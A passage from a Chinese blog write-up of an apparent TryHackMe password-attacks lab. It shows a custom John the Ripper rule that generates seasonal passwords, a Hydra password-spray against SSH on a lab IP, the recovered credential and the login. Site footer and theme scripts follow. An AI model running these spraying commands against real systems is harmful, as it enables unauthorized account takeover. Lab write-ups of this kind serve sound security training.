+<p>使用以下用户名列表：</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@THM</span>:~# cat usernames-list.txt 
+admin
+phillips
+burgess
+pittman
+guess</code></pre>
+<p>执行密码喷射攻击以访问 SSH://10.10.183.122 服务器以读取 /etc/flag。旗帜是什么？</p>
+<p>根据给的提示：</p>
+<pre><code class="hljs scss">季节+年份+特殊字符。对于季节，请考虑使用“Full”而不是“Autumn”。对于年份，请尝试 (<span class="hljs-number">2020</span>-<span class="hljs-number">2021</span>) 之间的年份</code></pre>
+<p>那只能先自定义规则，通过john来生成密码列表了</p>
+<p>先构造含有Fall的文件，然后自定义规则</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217823.png" alt="image-20240715210446884"></p>
+<p>之后生成目标单词列表</p>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
+└─$ john <span class="hljs-attr">--wordlist</span>=passwd<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--rule</span>=THM-PassSpray <span class="hljs-attr">--stdout</span> &gt; pass<span class="hljs-selector-class">.txt</span>                             
+Using default <span class="hljs-selector-tag">input</span> encoding: UTF-<span class="hljs-number">8</span>
+Press <span class="hljs-string">'q'</span> or Ctrl-C to abort, almost any other key for status
+<span class="hljs-number">32</span>p <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">100.00%</span> (<span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">15</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>) <span class="hljs-number">1600</span>p/s Fall2021$</code></pre>
+<p>接着爆破即可</p>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
+└─$ hydra -L usernames<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">P</span> pass<span class="hljs-selector-class">.txt</span> ssh://<span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span> 
+Hydra v9.<span class="hljs-number">5</span> (c) <span class="hljs-number">2023</span> by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">15</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">53</span>
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span class="hljs-number">4</span>
+[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">160</span> login tries (l:<span class="hljs-number">5</span>/p:<span class="hljs-number">32</span>), ~<span class="hljs-number">10</span> tries per task
+[DATA] attacking ssh://<span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span>:<span class="hljs-number">22</span>/
+[<span class="hljs-number">22</span>][ssh] host: <span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span>   login: burgess   password: Fall2021@
+<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">15</span> <span class="hljs-number">21</span>:<span class="hljs-number">04</span>:<span class="hljs-number">38</span></code></pre>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
+└─$ ssh burgess@<span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span>                                                                          
+The authenticity of host <span class="hljs-string">'10.10.183.122 (10.10.183.122)'</span> can<span class="hljs-string">'t be established.</span>
+<span class="hljs-string">ED25519 key fingerprint is SHA256:cCRW5ZAuU9J19QjyoeN8D6GW5SqrButZKEqD2t3+Kx4.</span>
+<span class="hljs-string">This key is not known by any other names.</span>
+<span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="hljs-string">Warning: Permanently added '</span><span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span><span class="hljs-string">' (ED25519) to the list of known hosts.</span>
+<span class="hljs-string">burgess@10.10.183.122'</span>s <span class="hljs-attribute">password</span>: 
+Welcome to Ubuntu <span class="hljs-number">18.04</span>.<span class="hljs-number">5</span> LTS (GNU/Linux <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">1058</span>-aws x86_64)</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217824.png" alt="image-20240715210623740"></p>
+<h1 id="0x08-总结">0x08 总结</h1>
+<p>该会议室介绍了不同密码攻击的基本概念以及如何创建自定义和有针对性的密码列表。我们涵盖并讨论了各种主题，包括:</p>
+<ul>
+<li>默认、弱、泄漏的组合词表</li>
+<li>密码分析</li>
+<li>Offline password attacks 离线密码攻击</li>
+<li>Online password attacks 在线密码攻击</li>
+</ul>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/07/16/thm-dang-qian-tai-shi/">THM-当前态势</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/07/14/ctf-shua-ti/">CTF刷题</a></div></section></div>
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>感谢大佬们的不吝赐教！</p>
+
+    </section>
+    <section class='body cmt-body twikoo'>
+      
+
+<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
+本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x01 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AF%86%E7%A0%81"><span class="toc-text">什么是密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E5%A6%82%E4%BD%95"><span class="toc-text">密码的安全性如何</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="toc-text">0x02 密码攻击技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B8%8E%E5%AF%86%E7%A0%81%E7%8C%9C%E6%B5%8B"><span class="toc-text">密码破解与密码猜测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90-%E9%BB%98%E8%AE%A4-%E5%BC%B1-%E6%B3%84%E9%9C%B2-%E7%BB%84%E5%90%88%E5%92%8C%E7%94%A8%E6%88%B7%E5%90%8D%E5%8D%95%E8%AF%8D%E5%88%97%E8%A1%A8"><span class="toc-text">0x03 密码分析- 默认、弱、泄露、组合和用户名单词列表</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81"><span class="toc-text">默认密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%AF%86%E7%A0%81"><span class="toc-text">弱密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-text">密码泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E8%AF%8D%E8%A1%A8"><span class="toc-text">组合词表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E5%88%B6%E8%AF%8D%E6%B1%87%E8%A1%A8"><span class="toc-text">定制词汇表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D%E5%8D%95%E8%AF%8D%E5%88%97%E8%A1%A8"><span class="toc-text">用户名单词列表</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90-%E5%AF%86%E9%92%A5%E7%A9%BA%E9%97%B4%E6%8A%80%E6%9C%AF%E5%92%8C-cupp"><span class="toc-text">0x04 密码分析- 密钥空间技术和 CUPP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#keyspace%E6%8A%80%E6%9C%AF"><span class="toc-text">Keyspace技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cupp-%E5%B8%B8%E7%94%A8%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90%E5%99%A8"><span class="toc-text">CUPP - 常用用户密码分析器</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E7%A6%BB%E7%BA%BF%E6%94%BB%E5%87%BB-%E5%AD%97%E5%85%B8%E5%92%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">0x05 离线攻击 - 字典和暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB"><span class="toc-text">字典攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%9B%AE%E5%8A%9B%E6%94%BB%E5%87%BB"><span class="toc-text">蛮力攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E7%A6%BB%E7%BA%BF%E6%94%BB%E5%87%BB-%E5%9F%BA%E4%BA%8E%E8%A7%84%E5%88%99"><span class="toc-text">0x06 离线攻击 - 基于规则</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%A7%84%E5%88%99%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-text">基于规则的攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E9%83%A8%E7%BD%B2%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-text">0x07 部署虚拟机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB"><span class="toc-text">在线密码攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra"><span class="toc-text">Hydra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp"><span class="toc-text">FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smtp"><span class="toc-text">SMTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh"><span class="toc-text">SSH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2"><span class="toc-text">HTTP 登录页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%94%BB%E5%87%BB"><span class="toc-text">密码喷洒攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh"><span class="toc-text">SSH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rdp"><span class="toc-text">RDP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#outlook-web-access-owa-portal"><span class="toc-text">Outlook Web Access (OWA) portal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb"><span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-text">实践练习</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E6%80%BB%E7%BB%93"><span class="toc-text">0x08 总结</span></a></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.28.1" async></script>
+
+<!-- optional -->
+
+  <script>
+    function load_twikoo() {
+        if (!document.querySelectorAll("#twikoo_container")[0]) return;
+        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
+            const el = document.getElementById("twikoo_container");
+            var path = el.getAttribute('comment_id');
+            if (!path) {
+                path = decodeURI(window.location.pathname);
+            }
+            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
+                el: '#twikoo_container',
+                path: path,
+            }));
+        });
+    }
+
+    window.addEventListener('DOMContentLoaded', (event) => {
+        load_twikoo();
+    });
+</script>
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
